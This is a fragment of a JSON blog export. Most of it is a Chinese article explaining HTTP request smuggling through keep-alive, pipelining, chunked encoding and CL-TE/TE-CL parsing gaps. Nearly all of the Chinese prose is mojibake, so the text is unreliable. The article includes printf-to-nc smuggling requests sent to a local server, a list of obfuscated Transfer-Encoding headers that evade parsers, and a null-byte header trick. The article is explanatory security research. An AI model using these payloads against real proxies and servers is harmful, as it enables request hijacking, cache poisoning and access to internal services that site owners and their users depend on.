it\n","date":"2019-12-08T17:09:00Z","permalink":"https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en/","title":"Help you understand HTTP Smuggling in one article"},{"content":"ä»Šå¹´çš„ Defcon 27 ä¸ Black Hat ä¸Šéƒ½æœ‰æåˆ° HTTP DESYNC ATTACKS ï¼Œå‰å‡ ä¸ªæœˆå°±æƒ³æŠ½æ—¶é—´æ¥ç ”ç©¶ç ”ç©¶äº†ï¼Œå¥ˆä½•ä¸€ç›´æ²¡ä»€ä¹ˆæ—¶é—´ï¼Œæœ€è¿‘æŠ½æ—¶é—´ä¸“é—¨çœ‹äº†ä¸€ä¸‹ã€‚\nåœ¨å‰äº›å¤©ç ”ç©¶çš„æ—¶å€™ï¼Œæ°å·§ mengchen@çŸ¥é“åˆ›å®‡404å®éªŒå®¤ ä¹Ÿå‘è¡¨äº†åè®®å±‚çš„æ”»å‡»â€”â€”HTTPè¯·æ±‚èµ°ç§æ–‡ç« ï¼Œä¹Ÿå¸¦ç»™äº†è‡ªå·±æ›´å¤šçš„å¯ç¤ºï¼Œå¸ˆå‚…çš„æ–‡ç« å†™çš„éå¸¸çš„ä¸é”™ï¼Œå¢™è£‚å»ºè®®é˜…è¯»ï¼Œè¿™é‡Œæˆ‘ç»“åˆå¸ˆå‚…çš„æ–‡ç« è·Ÿè‡ªå·±çš„ä¸€äº›ç†è§£è¿›è¡Œä¸€äº›æ•´ç†ï¼Œæœ¬æ–‡äº¦å¯ç†è§£ä¸ºé‚£ç¯‡æ–‡ç« çš„è¡¥å……ä¸æ›´è¯¦ç»†çš„æè¿°ã€‚\næ•´ç¯‡æ–‡ç« ç”±äºè‡ªå·±æ—¶é—´é—®é¢˜ï¼Œå‰å‰ååæ‹–äº†ä¸¤ä¸ªæœˆå·¦å³ï¼Œä¸­é—´æ—¶é—´é—´éš”å¯èƒ½æ¯”è¾ƒä¹…ï¼Œæ‰€ä»¥æ–‡ç« ä¼šæœ‰æ¯”è¾ƒå¤šçš„ç–æ¼ï¼Œè¿˜è¯·å¸ˆå‚…ä»¬çœ‹åç›´æ¥æŒ‡å‡ºæ–§æ­£ã€‚å†™ä½œä¸æ˜“ï¼Œè¿˜è¯·å¸ˆå‚…ä»¬å¤šå¤šæ‹…å¾…ã€‚æœ€è¿‘ä¹Ÿä¸€ç›´åœ¨å…³æ³¨è¿™æ–¹é¢çš„å®‰å…¨é—®é¢˜ï¼Œæ¬¢è¿ä¸€èµ·å­¦ä¹ è®¨è®º: ) è”ç³»æ–¹å¼ï¼šemVkZHl1Lmx1QGdtYWlsLmNvbQ==\nåç»­å¦‚æœæœ‰æ–°çš„æ€»ç»“å‘ç°ä¹Ÿä¼šå‘è‡ªå·±çš„åƒåœ¾åšå®¢æˆ–è€…å…ˆçŸ¥ï¼ˆå°±çœ‹å›½é™…é»‘å®¢é™ˆå¸ˆå‚…ç»™ä¸ç»™è¿‡äº†ï¼‰\nTL;NR  \nPic from https://twitter.com/SpiderSec/status/1200413390339887104?s=19\nTimeLine åœ¨æˆ‘ä»¬æ HTTP Smuggling ä¹‹å‰æˆ‘ä»¬é¦–å…ˆæ¥çœ‹çœ‹å…¶ä¸­çš„æ¼”å˜è¿‡ç¨‹ï¼š\n@Amit Klein åœ¨ 2004 å¹´æå‡º HTTP Response Splitting æŠ€æœ¯ï¼Œæ˜¯ HTTP Smuggling æ”»å‡»çš„é›å½¢ã€‚\nå…³äº HTTP Smuggling è¿™ç§æ”»å‡»æ–¹å¼åœ¨ 2005 å¹´å·²ç”± @Watchfire é¦–æ¬¡æå‡º HTTP Request Smuggling ã€‚\nHTTP Parameter Pollution (HPP)ï¼Œä¹Ÿå°±æ˜¯ HTTP å‚æ•°æ±¡æŸ“ï¼Œè¿™å…¶å®ä¹Ÿç®—æ˜¯ä¸€ç§\u0026quot;ç‰¹æ®Š\u0026quot;çš„ HTTP Smuggling æ”»å‡»ï¼Œåœ¨ 2009 å¹´ç”± @Stefano di Paola \u0026amp; @Luca Carettoni åœ¨ OWASP Poland conference ä¸Šé¦–æ¬¡æå‡ºï¼Œä¸€ç»æå‡ºå°±å¼•èµ·äº†æ¯”è¾ƒå¤§çš„è½°åŠ¨ï¼Œè¢«å¹¿æ³›è¿ç”¨åœ¨ç»•è¿‡ WAF å½“ä¸­ã€‚\n2016 å¹´ Defcon 24 ï¼Œ@regilero æå‡ºäº† Hiding Wookiees In Httpï¼Œè¿›ä¸€æ­¥æ­ç¤ºäº† HTTP Smuggling è¿™ç§æ”»å‡»æ–¹å¼ã€‚\n2019 å¹´ Defcon 27ï¼Œ @James Kettle æå‡ºäº† HTTP Desync Attacks: Smashing into the Cell Next Doorï¼Œè®²è§£äº†å¦‚ä½•ç”¨ HTTP Smuggling æŠ€æœ¯æŒ–æ˜åˆ°äº† Paypal çš„æ¼æ´ã€‚\nCauses ç„¶è€Œ@James Kettle çš„ PPT é‡Œé¢ä¹Ÿå¹¶æ²¡æœ‰éå¸¸è¯¦ç»†ç»†è‡´åœ°è®²è¿°è¿™ä¸ªæ”»å‡»æ˜¯ä»€ä¹ˆï¼Œä»¥åŠæ€ä¹ˆå½¢æˆçš„ï¼Œå½“åˆè‡ªå·±çœ‹å®Œè¿˜æ˜¯æŠ±ç€éå¸¸å¤§çš„ç–‘æƒ‘çš„ï¼Œåæ¥å­¦ä¹ äº† @regilero åšå®¢ä¸­å…³äº HTTP Smuggling çš„æ–‡ç« ï¼Œæˆ‘æ‰æœ‰äº†æ¸…æ™°çš„è®¤è¯†ã€‚\nHTTP Connection Mod  â€‹\tåœ¨HTTP1.0ä¹‹å‰çš„åè®®è®¾è®¡ä¸­ï¼Œå®¢æˆ·ç«¯æ¯è¿›è¡Œä¸€æ¬¡HTTPè¯·æ±‚ï¼Œå°±éœ€è¦åŒæœåŠ¡å™¨å»ºç«‹ä¸€ä¸ªTCPé“¾æ¥ã€‚è€Œç°ä»£çš„Webç½‘ç«™é¡µé¢æ˜¯ç”±å¤šç§èµ„æºç»„æˆçš„ï¼Œæˆ‘ä»¬è¦è·å–ä¸€ä¸ªç½‘é¡µçš„å†…å®¹ï¼Œä¸ä»…è¦è¯·æ±‚HTMLæ–‡æ¡£ï¼Œè¿˜æœ‰JSã€CSSã€å›¾ç‰‡ç­‰å„ç§å„æ ·çš„èµ„æºï¼Œè¿™æ ·å¦‚æœæŒ‰ç…§ä¹‹å‰çš„åè®®è®¾è®¡ï¼Œå°±ä¼šå¯¼è‡´HTTPæœåŠ¡å™¨çš„è´Ÿè½½å¼€é”€å¢å¤§ã€‚äºæ˜¯åœ¨HTTP1.1ä¸­ï¼Œå¢åŠ äº†Keep-Aliveå’ŒPipelineè¿™ä¸¤ä¸ªç‰¹æ€§ã€‚\n Keep-Alive æ ¹æ® RFC7230 æˆ‘ä»¬å¯ä»¥çŸ¥é“\n â€‹\tHTTP/1.1 defaults to the use of \u0026ldquo;persistent connections\u0026rdquo;, allowing multiple requests and responses to be carried over a single connection. The \u0026ldquo;close\u0026rdquo; connection option is used to signal that a connection will not persist after the current request/response. HTTP implementations SHOULD support persistent connections.\n åœ¨ HTTP/1.1 ä¸­é»˜è®¤ä½¿ç”¨Keep-Aliveï¼Œä»è€Œå…è®¸åœ¨å•ä¸ªè¿æ¥ä¸Šæ‰¿è½½å¤šä¸ªè¯·æ±‚å’Œå“åº”ã€‚\n æ‰€è°“Keep-Aliveï¼Œå°±æ˜¯åœ¨HTTPè¯·æ±‚ä¸­å¢åŠ ä¸€ä¸ªç‰¹æ®Šçš„è¯·æ±‚å¤´Connection: Keep-Aliveï¼Œå‘Šè¯‰æœåŠ¡å™¨ï¼Œæ¥æ”¶å®Œè¿™æ¬¡HTTPè¯·æ±‚åï¼Œä¸è¦å…³é—­TCPé“¾æ¥ï¼Œåé¢å¯¹ç›¸åŒç›®æ ‡æœåŠ¡å™¨çš„HTTPè¯·æ±‚ï¼Œé‡ç”¨è¿™ä¸€ä¸ªTCPé“¾æ¥ï¼Œè¿™æ ·åªéœ€è¦è¿›è¡Œä¸€æ¬¡TCPæ¡æ‰‹çš„è¿‡ç¨‹ï¼Œå¯ä»¥å‡å°‘æœåŠ¡å™¨çš„å¼€é”€ï¼ŒèŠ‚çº¦èµ„æºï¼Œè¿˜èƒ½åŠ å¿«è®¿é—®é€Ÿåº¦ã€‚å½“ç„¶ï¼Œè¿™ä¸ªç‰¹æ€§åœ¨HTTP1.1ä¸­æ˜¯é»˜è®¤å¼€å¯çš„ã€‚\n å½“ç„¶ï¼Œæœ‰äº›è¯·æ±‚å¸¦ç€Connection: closeçš„è¯ï¼Œé€šä¿¡å®Œæˆä¹‹åï¼ŒæœåŠ¡å™¨ä¼šä¸­æ–­ TCP è¿æ¥ã€‚\nPipline  æœ‰äº†Keep-Aliveä¹‹åï¼Œåç»­å°±æœ‰äº†Pipelineï¼Œåœ¨è¿™é‡Œå‘¢ï¼Œå®¢æˆ·ç«¯å¯ä»¥åƒæµæ°´çº¿ä¸€æ ·å‘é€è‡ªå·±çš„HTTPè¯·æ±‚ï¼Œè€Œä¸éœ€è¦ç­‰å¾…æœåŠ¡å™¨çš„å“åº”ï¼ŒæœåŠ¡å™¨é‚£è¾¹æ¥æ”¶åˆ°è¯·æ±‚åï¼Œéœ€è¦éµå¾ªå…ˆå…¥å…ˆå‡ºæœºåˆ¶ï¼Œå°†è¯·æ±‚å’Œå“åº”ä¸¥æ ¼å¯¹åº”èµ·æ¥ï¼Œå†å°†å“åº”å‘é€ç»™å®¢æˆ·ç«¯ã€‚\nç°å¦‚ä»Šï¼Œæµè§ˆå™¨é»˜è®¤æ˜¯ä¸å¯ç”¨Pipelineçš„ï¼Œä½†æ˜¯ä¸€èˆ¬çš„æœåŠ¡å™¨éƒ½æä¾›äº†å¯¹Piplelineçš„æ”¯æŒã€‚\n åœ¨ HTTP/1.1 ä¸­æ¯”è¾ƒé‡è¦çš„å¼•å…¥å°±æ˜¯ pipeline æŠ€æœ¯äº†ï¼Œä»¥ä¸‹æ˜¯ä½¿ç”¨ä»¥åŠä¸ä½¿ç”¨ piepeline æŠ€æœ¯çš„å¯¹æ¯”å›¾ï¼š\n \næˆ‘ä»¬å¯ä»¥æ¸…æ™°åœ°çœ‹åˆ°ï¼Œä½¿ç”¨äº† pipeline ä¹‹åä¸å¿…å†éœ€è¦ç­‰å¾…å‰ä¸€ä¸ªè¯·æ±‚å®Œæˆå…¶å“åº”å†å¤„ç†ç¬¬äºŒä¸ªè¯·æ±‚äº†ï¼Œè¿™ä¸ªæœ‰ç‚¹å¼‚æ­¥å¤„ç†çš„æ„æ€åœ¨é‡Œé¢ã€‚\nMessage Body https://tools.ietf.org/html/rfc7230#section-3.3\nTransfer-Encoding  â€‹\tTransfer-Encoding is analogous to the Content-Transfer-Encoding field of MIME, which was designed to enable safe transport of binary data over a 7-bit transport service ([RFC2045], Section 6). However, safe transport has a different focus for an 8bit-clean transfer protocol. In HTTP\u0026rsquo;s case, Transfer-Encoding is primarily intended to accurately delimit a dynamically generated payload and to distinguish payload encodings that are only applied for transport efficiency or security from those that are characteristics of the selected resource.\n Transfer-Encoding æ˜¯ä¸€ç§è¢«è®¾è®¡ç”¨æ¥æ”¯æŒ 7-bit ä¼ è¾“æœåŠ¡å®‰å…¨ä¼ è¾“äºŒè¿›åˆ¶æ•°æ®çš„å­—æ®µï¼Œæœ‰ç‚¹ç±»ä¼¼äº MIME (Multipurpose Internet Mail Extensions) Header ä¸­çš„ Content-Transfer-Encoding ã€‚åœ¨HTTPçš„æƒ…å†µä¸‹ï¼ŒTransfer-Encoding çš„ä¸»è¦ç”¨æ¥ä»¥æŒ‡å®šçš„ç¼–ç å½¢å¼ç¼–ç  payload body å®‰å…¨åœ°ä¼ è¾“ç»™ç”¨æˆ·ã€‚åœ¨ HTTP/1.1 ä¸­å¼•å…¥ï¼Œåœ¨ HTTP/2 ä¸­å–æ¶ˆã€‚\nMDN åˆ—ä¸¾äº†å‡ ç§å±æ€§ï¼š\nchunked | compress | deflate | gzip | identity æˆ‘ä»¬è¿™é‡Œä¸»è¦å…³æ³¨ chunked è¿™ä¸€ç§ä¼ è¾“ç¼–ç æ–¹å¼ï¼Œå®ƒåœ¨ç½‘ç»œæ”»å‡»ä¸­ä¹Ÿä¸æ˜¯ç¬¬ä¸€æ¬¡æåŠäº†ï¼Œä¹‹å‰å°±æœ‰å¸ˆå‚…åˆ©ç”¨è¿™ä¸ªå­—æ®µå»ç»•è¿‡ä¸€äº› WAFï¼Œå¯ä»¥å‚è€ƒ åˆ©ç”¨åˆ†å—ä¼ è¾“åŠæ‰“æ‰€æœ‰WAFï¼Œä¹Ÿæ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ bypass æŠ€å·§ã€‚\næˆ‘ä»¬å¯ä»¥åœ¨RFC7230ä¸­æŸ¥çœ‹åˆ°æœ‰å…³åˆ†å—ä¼ è¾“çš„å®šä¹‰è§„èŒƒã€‚\n 4.1. Chunked Transfer Coding\nThe chunked transfer coding wraps the payload body in order to transfer it as a series of chunks, each with its own size indicator, followed by an OPTIONAL trailer containing header fields. Chunked enables content streams of unknown size to be transferred as a sequence of length-delimited buffers, which enables the sender to retain connection persistence and the recipient to know when it has received the entire message.\n chunked-body = *chunk last-chunk trailer-part CRLF chunk = chunk-size [ chunk-ext ] CRLF chunk-data CRLF chunk-size = 1*HEXDIG last-chunk = 1*(\u0026quot;0\u0026quot;) [ chunk-ext ] CRLF chunk-data = 1*OCTET ; a sequence of chunk-size octets  The chunk-size field is a string of hex digits indicating the size of the chunk-data in octets. The chunked transfer coding is complete when a chunk with a chunk-size of zero is received, possibly followed by a trailer, and finally terminated by an empty line.\nA recipient MUST be able to parse and decode the chunked transfer coding.\n4.1.1. Chunk Extensions\nThe chunked encoding allows each chunk to include zero or more chunk extensions, immediately following the chunk-size, for the sake of supplying per-chunk metadata (such as a signature or hash), mid-message control information, or randomization of message body size.\n chunk-ext = *( \u0026quot;;\u0026quot; chunk-ext-name [ \u0026quot;=\u0026quot; chunk-ext-val ] ) chunk-ext-name = token chunk-ext-val = token / quoted-string  The chunked encoding is specific to each connection and is likely to be removed or recoded by each recipient (including intermediaries) before any higher-level application would have a chance to inspect the extensions. Hence, use of chunk extensions is generally limited\nto specialized HTTP services such as \u0026ldquo;long polling\u0026rdquo; (where client and server can have shared expectations regarding the use of chunk extensions) or for padding within an end-to-end secured connection.\nA recipient MUST ignore unrecognized chunk extensions. A server ought to limit the total length of chunk extensions received in a request to an amount reasonable for the services provided, in the same way that it applies length limitations and timeouts for other parts of a message, and generate an appropriate 4xx (Client Error) response if that amount is exceeded.\n è¿™é‡Œå¦‚æœä½ ä¸æƒ³çœ‹çš„å¤ªä»”ç»†ï¼Œæˆ‘ä»¬åªéœ€è¦äº†è§£å®ƒæ˜¯æ€ä¹ˆä¸€ç§ç»“æ„å°±è¡Œäº†ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥å‚è€ƒ Wiki: Chunked transfer encoding ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬å¦‚æœè¦ä½¿ç”¨ chunked å‘é€ä»¥ä¸‹æ¶ˆæ¯\nWikipedia in\\r\\n\\r\\nchunks. æˆ‘ä»¬å¯ä»¥è¿™ä¹ˆå»å‘é€ï¼š\nPOSTT /xxx HTTP/1.1 Host: xxx Content-Type: text/plain Transfer-Encoding: chunked 4\\r\\n Wiki\\r\\n 5\\r\\n pedia\\r\\n e\\r\\n in\\r\\n\\r\\nchunks.\\r\\n 0\\r\\n \\r\\n è¿™é‡Œåšä¸ªç®€å•è§£é‡Šï¼Œæˆ‘ä»¬ä½¿ç”¨\\r\\nè¡¨ç¤º CRLF ï¼Œæ‰€ä»¥è¿™é‡Œçš„\\r\\næ˜¯ä¸¤ä¸ªå­—èŠ‚ï¼›ç¬¬ä¸€ä¸ªæ•°å­— 4 è¡¨ç¤ºçš„æ˜¯æ¥ä¸‹æ¥ä¼šæœ‰ 4 ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ Wiki è¿™ 4 ä¸ªå­—æ¯ï¼Œç„¶åæŒ‰ç…§ RFC æ–‡æ¡£æ ‡å‡†ï¼Œå­—æ¯ Wiki éƒ¨åˆ†åé¢éœ€è¦è·Ÿ\\r\\nè¡¨ç¤º chunk-data éƒ¨åˆ†ï¼Œæ•°å­— 4 åé¢éœ€è¦è·Ÿ\\r\\nè¡¨ç¤º chunk-size éƒ¨åˆ†ï¼Œè€Œä¸”è¿™ä¸ªæ•°å­—æ˜¯ä¸ªåå…­è¿›åˆ¶æ•°ï¼Œæ¯”å¦‚ç¬¬ä¸‰ä¸ªæ•°æ®ï¼Œ\ne\\r\\n in\\r\\n\\r\\nchunks.\\r\\n è¿™é‡Œç¬¬ä¸€ä¸ªå­˜åœ¨ç©ºæ ¼ï¼Œæ•°æ®å½“ä¸­çš„\\r\\nç®—ä¸¤ä¸ªå­—ç¬¦ï¼Œæœ€åä¸€ä¸ª\\r\\nè¡¨ç¤ºæ•°æ®ç»“æŸï¼Œè¿™æ ·çš„è¯ï¼Œç¬¬ä¸€ä¸ªç©ºæ ¼ 1 ä¸ªå­—èŠ‚ + in 2ä¸ªå­—èŠ‚ + 2 ä¸ª \\r\\n ç®— 4 ä¸ªå­—èŠ‚ + chunks. 7ä¸ªå­—èŠ‚ = 14 ä¸ªå­—èŠ‚ï¼Œåå…­è¿›åˆ¶è¡¨ç¤º 14 ä¹Ÿå°±æ˜¯ e ã€‚\næœ€åä¸€ä¸ª0\\r\\n\\r\\nè¡¨ç¤º chunk éƒ¨åˆ†ç»“æŸã€‚\nBackground æœ¬èº«è¿™äº›ä¸œè¥¿æ˜¯æ²¡æœ‰ä»€ä¹ˆå±å®³çš„ï¼Œéƒ½æ˜¯é€šè¿‡å„ç§æ–¹å¼æé«˜ç½‘ç»œä¼ è¾“é€Ÿç‡ï¼Œä½†æ˜¯åœ¨ä¸€äº›ç‰¹æ®Šçš„æƒ…å†µä¸‹å°±ä¼šå‡ºç°äº†ä¸€äº›ç›¸åº”çš„å®‰å…¨é—®é¢˜ã€‚\n â€‹\tä¸ºäº†æå‡ç”¨æˆ·çš„æµè§ˆé€Ÿåº¦ï¼Œæé«˜ä½¿ç”¨ä½“éªŒï¼Œå‡è½»æœåŠ¡å™¨çš„è´Ÿæ‹…ï¼Œå¾ˆå¤šç½‘ç«™éƒ½ç”¨ä¸Šäº†CDNåŠ é€ŸæœåŠ¡ï¼Œæœ€ç®€å•çš„åŠ é€ŸæœåŠ¡ï¼Œå°±æ˜¯åœ¨æºç«™çš„å‰é¢åŠ ä¸Šä¸€ä¸ªå…·æœ‰ç¼“å­˜åŠŸèƒ½çš„åå‘ä»£ç†æœåŠ¡å™¨ï¼Œç”¨æˆ·åœ¨è¯·æ±‚æŸäº›é™æ€èµ„æºæ—¶ï¼Œç›´æ¥ä»ä»£ç†æœåŠ¡å™¨ä¸­å°±å¯ä»¥è·å–åˆ°ï¼Œä¸ç”¨å†ä»æºç«™æ‰€åœ¨æœåŠ¡å™¨è·å–ã€‚è¿™å°±æœ‰äº†ä¸€ä¸ªå¾ˆå…¸å‹çš„æ‹“æ‰‘ç»“æ„ã€‚\n è¿™é‡Œå¼•ç”¨ @mengchen å¸ˆå‚…å‘çš„å›¾ï¼š\n \nä¸€èˆ¬æ¥è¯´ï¼Œåå‘ä»£ç†ä¸åç«¯æœåŠ¡å™¨ä¸ä¼šä½¿ç”¨ pipeline æŠ€æœ¯ï¼Œç”šè‡³ä¹Ÿä¸ä¼šå»ä½¿ç”¨ Keep-Alive ï¼Œæ›´å¤šæ—¶å€™åå‘ä»£ç†é‡‡å–çš„æªæ–½æ˜¯é‡ç”¨ TCP é“¾æ¥ï¼Œå› ä¸ºå¯¹äºåå‘ä»£ç†ä¸åç«¯æœåŠ¡å™¨æ¥è¯´ï¼Œåå‘ä»£ç†æœåŠ¡å™¨ä¸åç«¯æœåŠ¡å™¨ IP ç›¸å¯¹å›ºå®šï¼Œä¸åŒç”¨æˆ·çš„è¯·æ±‚é€šè¿‡ä»£ç†æœåŠ¡å™¨ä¸åç«¯æœåŠ¡å™¨å»ºç«‹é“¾æ¥ï¼Œå°†è¿™ä¸¤è€…ä¹‹é—´çš„ TCP é“¾æ¥è¿›è¡Œé‡ç”¨ï¼Œä¹Ÿå°±é¡ºç†æˆç« äº†ã€‚\n \n \n \n â€‹\tå½“æˆ‘ä»¬å‘ä»£ç†æœåŠ¡å™¨å‘é€ä¸€ä¸ªæ¯”è¾ƒæ¨¡ç³Šçš„HTTPè¯·æ±‚æ—¶ï¼Œç”±äºä¸¤è€…æœåŠ¡å™¨çš„å®ç°æ–¹å¼ä¸åŒï¼Œå¯èƒ½ä»£ç†æœåŠ¡å™¨è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œç„¶åå°†å…¶è½¬å‘ç»™äº†åç«¯çš„æºç«™æœåŠ¡å™¨ï¼Œä½†æºç«™æœåŠ¡å™¨ç»è¿‡è§£æå¤„ç†åï¼Œåªè®¤ä¸ºå…¶ä¸­çš„ä¸€éƒ¨åˆ†ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œå‰©ä¸‹çš„é‚£ä¸€éƒ¨åˆ†ï¼Œå°±ç®—æ˜¯èµ°ç§çš„è¯·æ±‚ï¼Œå½“è¯¥éƒ¨åˆ†å¯¹æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚é€ æˆäº†å½±å“ä¹‹åï¼Œå°±å®ç°äº†HTTPèµ°ç§æ”»å‡»ã€‚\n HTTP Smuggling æ”»å‡»æ­£æ˜¯åŸºäºåå‘ä»£ç†ä¸åç«¯æœåŠ¡å™¨å¯¹äº HTTP è¯·æ±‚è§£æå¤„ç†ä¸ä¸€è‡´ï¼Œåˆ©ç”¨è¿™ç§å·®å¼‚æ€§æˆ‘ä»¬å¯ä»¥åœ¨ä¸€ä¸ª HTTP è¯·æ±‚ä¸­ â€œåµŒå…¥â€ å¦ä¸€ä¸ª HTTP è¯·æ±‚ï¼Œä»¥è¾¾åˆ°æˆ‘ä»¬â€œèµ°ç§â€è¯·æ±‚çš„ç›®çš„ï¼Œç›´æ¥è¡¨ç°ä¸ºæˆ‘ä»¬å¯ä»¥è®¿é—®å†…ç½‘æœåŠ¡ï¼Œæˆ–è€…é€ æˆä¸€äº›å…¶ä»–çš„æ”»å‡»ã€‚\nAttack Method æ—¢ç„¶æ˜¯åŸºäºè§£æå·®å¼‚ï¼Œé‚£æˆ‘ä»¬ä¼šæœ‰ä»€ä¹ˆè§£æå·®å¼‚å‘¢ï¼Ÿåœºæ™¯ä»ç„¶æ˜¯ä¸Šè¿°æ„æ¶çš„åœºæ™¯ï¼Œåªä¸è¿‡æˆ‘ä»¬ç®€åŒ–ä¸€ä¸‹ï¼ŒæŠŠåç«¯æœåŠ¡å™¨å›ºå®šä¸ºä¸€å°ï¼Œå°±ä¸å­˜åœ¨æŸäº›æ¦‚ç‡çš„æƒ…å†µäº†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¶æ„ç±»ä¼¼äºå¦‚ä¸‹ç¤ºæ„å›¾ï¼š\n User Front Backend | | | |------A-------\u0026gt;| | | |-------A------\u0026gt;| | |\u0026lt;-A(200)-------| |\u0026lt;-A(200)-------| | æˆ‘ä»¬çŸ¥é“ Content-Length ä¸ Transfer-Encoding å‡å¯ä»¥ä½œä¸º POST æ•°æ®ä¼ è¾“æ—¶å¤„ç† body çš„æ–¹å¼ï¼Œä¸ºäº†æ–¹ä¾¿é˜…è¯»ä»¥åŠç å­—ï¼Œæˆ‘ä»¬å¯¹å­—æ®µå¤„ç†ä¼˜å…ˆè§„åˆ™æœ‰ä»¥ä¸‹ç®€å†™è§„åˆ™ï¼š\n CL-TE ä»£è¡¨ Front ä»¥ Content-Length ä¼˜å…ˆå¤„ç†ï¼ŒBackend ä»¥ Transfer-Encoding ä¼˜å…ˆå¤„ç† TE-CL ä»£è¡¨ Front ä»¥ Transfer-Encoding ä¼˜å…ˆå¤„ç†ï¼ŒBackend ä»¥ Content-Length ä¼˜å…ˆå¤„ç†  å¹¶ä¸” Front ä»£è¡¨çš„æ˜¯åå‘ä»£ç†ç­‰å…¸å‹çš„å‰ç«¯æœåŠ¡å™¨ï¼ŒBackend ä»£è¡¨çš„æ˜¯å¤„ç†è¯·æ±‚çš„åç«¯ä¸šåŠ¡æœåŠ¡å™¨ï¼Œä»¥ä¸‹å‡ç”±\\r\\nä»£æ›¿ CRLFï¼Œé•¿åº¦ä¸ºä¸¤ä¸ªå­—èŠ‚ã€‚\nChunks Priority On Content-Length æœ‰äº›åŒå­¦å¯èƒ½çœ‹åˆ°è¿™è·Ÿæˆ‘ä¼šæœ‰åŒæ ·çš„ç–‘æƒ‘ï¼Œå¯¹äº CL \u0026amp; TE è§£æä¼˜å…ˆçº§é¡ºåºçš„é—®é¢˜éš¾é“ RFC æ–‡æ¡£æ²¡æœ‰åšå‡ºè§„èŒƒåŒ–å˜›ï¼Ÿæœ‰å½“ç„¶æ˜¯æœ‰çš„ï¼Œè§ RFC 7230 Message Body Length\n â€‹\tIf a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting (Section 9.4) and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.\n è™½ç„¶è¿™é‡Œæ˜¯æŒ‡å‡ºäº† TL ä¼˜å…ˆäº CL ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶å¯ä»¥é€šè¿‡ä¸€äº›æ–¹å¼ç»•è¿‡ï¼Œåˆæˆ–è€…è¯´ï¼Œé‚£ä¸ªä¸­é—´ä»¶çš„ä¹Ÿæ²¡æœ‰ä¾ç…§è¿™ä¸ª RFC æ ‡å‡†è§„èŒƒå®ç°ï¼Œè¿™å°±å¯¼è‡´äº†å·®å¼‚æ€§çš„å­˜åœ¨ã€‚\nä¾‹å¦‚æˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹ä»£ç æ¥å‘é€ HTTP è¯·æ±‚ï¼š\nprintf \u0026#39;GET / HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Content-length:56\\r\\n\u0026#39;\\ \u0026#39;Transfer-Encoding: chunked\\r\\n\u0026#39;\\ \u0026#39;Dummy:Header\\r\\n\\r\\n\u0026#39;\\ \u0026#39;0\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;GET /tmp HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Dummy:Header\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;GET /tests HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Dummy:Header\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ | nc -q3 127.0.0.1 8080 ä»¥ä¸Šæ­£ç¡®çš„è§£æåº”è¯¥æ˜¯è§£ææˆä¸‰ä¸ªè¯·æ±‚ï¼š\nGET / HTTP/1.1 Host:localhost Content-length:56 Transfer-Encoding: chunked Dummy:Header 0 GET /tmp HTTP/1.1 Host:localhost Dummy:Header GET /tests HTTP/1.1 Host:localhost Dummy:Header è€Œå¦‚æœå­˜åœ¨ TE \u0026amp; CL ä¼˜å…ˆçº§é—®é¢˜çš„è¯ï¼Œä¼šè¢«è§£ææˆä¸¤ä¸ªè¯·æ±‚ï¼š\nGET / HTTP/1.1[CRLF] Host:localhost[CRLF] Content-length:56[CRLF] Transfer-Encoding: chunked[CRLF] (ignored and removed, hopefully) Dummy:Header[CRLF] [CRLF] 0[CRLF] (start of 56 bytes of body) [CRLF] GET /tmp HTTP/1.1[CRLF] Host:localhost[CRLF] Dummy:Header[CRLF] (end of 56 bytes of body, not parsed) GET /tests HTTP/1.1 Host:localhost Dummy:Header Bad Chunked Transmission æ ¹æ® RFC7230 section 3.3.3 ï¼š\n If a Transfer-Encoding header field is present in a request and the chunked transfer coding is not the final encoding, the message body length cannot be determined reliably; the server MUST respond with the 400 (Bad Request) status code and then close the connection.\n ä¹Ÿå°±æ˜¯è¯´å½“æ¥å—åˆ°Transfer-Encoding: chunked, zorgçš„æ—¶å€™ï¼Œåº”è¯¥è¿”å› 400 é”™è¯¯ã€‚\nè¿™ç±»å¯ä»¥æœ‰å¾ˆå¤šç»•è¿‡ï¼Œæ¯”å¦‚ï¼š\nTransfer-Encoding: xchunked Transfer-Encoding : chunked Transfer-Encoding: chunked Transfer-Encoding: x Transfer-Encoding:[tab]chunked GET / HTTP/1.1 Transfer-Encoding: chunked X: X[\\n]Transfer-Encoding: chunked Transfer-Encoding : chunked Null In Headers åœ¨ä¸€äº›ç”¨ C å†™çš„ä¸­é—´ä»¶æœåŠ¡å™¨å½“ä¸­æ¯”è¾ƒå®¹æ˜“äº§ç”Ÿè¿™ä¸ªé—®é¢˜ï¼Œå› ä¸º\\0ä»£è¡¨å­—ç¬¦ä¸²ç»“æŸæ ‡å¿—ï¼Œå½“ç”¨åœ¨ header é‡Œé¢ï¼Œå¦‚æœæˆ‘ä»¬ç”¨\\0å°±å¯èƒ½è®©ä¸­é—´ä»¶å‡ºç°ä¸€äº›ä¸æ­£å¸¸çš„è§£æã€‚\næ¯”å¦‚è¯´ï¼š\n# 2 responses instead of 3 (2nd query is wipped out by pound, used as a body) printf \u0026#39;GET / HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ 